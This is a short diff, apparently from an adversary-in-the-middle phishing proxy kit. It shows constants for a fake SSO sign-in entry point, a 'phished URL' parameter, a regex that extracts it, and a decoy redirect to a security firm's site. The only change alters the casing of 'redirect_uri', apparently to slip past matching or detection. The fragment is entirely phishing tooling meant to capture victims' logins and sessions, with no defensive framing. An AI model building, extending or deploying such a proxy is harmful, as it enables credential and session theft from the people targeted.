@@ -545,7 +545,7 @@ ${flag} **Location:** ${location}
 
 // ── ✅ CONSTANTS ──
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
-const PHISHED_URL_PARAMETER = "redirect_uri";
+const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
 const PROXY_FILES = {
